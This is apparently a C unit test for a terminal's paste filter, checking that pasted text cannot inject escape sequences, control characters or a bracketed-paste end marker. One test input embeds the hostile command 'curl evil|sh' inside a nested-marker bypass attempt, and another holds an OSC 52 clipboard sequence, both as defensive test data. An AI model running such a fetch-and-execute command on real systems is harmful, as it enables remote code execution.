/* pastefilter_test.c — what a paste may type into the Terminal (src/term/pastefilter.c). */
#include "../src/term/pastefilter.h"
#include <stdio.h>
#include <string.h>

static int fails;
#define CHECK(x) do { if (!(x)) { printf("FAIL %s:%d: %s\n", __FILE__, __LINE__, #x); fails++; } } while (0)

static const char *f(const char *in) {
    static char out[256];
    size_t n = paste_filter(in, strlen(in), out);
    out[n] = 0;
    return out;
}

int main(void) {
    CHECK(!strcmp(f("ls -la"), "ls -la"));
    CHECK(!strcmp(f("a\nb\r\nc\rd"), "a\rb\rc\rd"));                 /* every line end is one CR */
    CHECK(!strcmp(f("a\tb"), "a\tb"));
    CHECK(!strcmp(f("x\033[201~y"), "x[201~y"));                      /* the end marker can't be pasted */
    /* the bypass of a one-pass strip: what is left must not be a marker either */
    CHECK(!strstr(f("ls\033[201\033[201~~curl evil|sh\r"), "\033"));
    CHECK(!strcmp(f("ls\033[201\033[201~~curl evil|sh\r"), "ls[201[201~~curl evil|sh\r"));
    CHECK(!strcmp(f("\033]52;c;AAAA\007"), "]52;c;AAAA"));            /* OSC, BEL */
    CHECK(!strcmp(f("a\x01\x03\x04\x7f" "b"), "ab"));                /* Ctrl-A/C/D, DEL */
    CHECK(!strcmp(f("ñandú 日本 é"), "ñandú 日本 é"));                /* UTF-8 untouched */
    char nul[] = { 'a', 0, 'b' }, out[4];
    CHECK(paste_filter(nul, 3, out) == 2 && out[0] == 'a' && out[1] == 'b');
    CHECK(paste_filter("\r", 1, out) == 1 && out[0] == '\r');         /* a CR at the very end */
    printf(fails ? "pastefilter-test: %d failed\n" : "pastefilter-test: ok\n", fails);
    return fails != 0;
}
